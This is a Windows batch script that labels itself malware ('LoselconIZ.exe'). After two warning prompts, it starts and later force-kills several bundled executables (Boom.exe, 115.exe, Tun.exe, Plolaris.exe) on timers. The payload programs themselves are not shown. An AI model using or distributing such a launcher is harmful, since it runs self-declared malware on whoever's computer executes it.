@echo off
title LoselconIZ.exe - Warning
cls
echo Run Malware?
pause
title LoselconIZ.exe - Last Warning
cls
echo ARE YOU SURE?? CLOSE IT AND DELETE IT NOW OR YOU WANT TO RUN!!
pause
start Source\Boom.exe
timeout 15
taskkill /f /im Boom.exe
start Source\115.exe
start Source\Tun.exe
timeout 25
taskkill /f /im 115.exe
taskkill /f /im Tun.exe
start Source\Plolaris.exe
start Source\Tun.exe
start Source\115.exe
timeout 10
taskkill /f /im Tun.exe
taskkill /f /im Plolaris.exe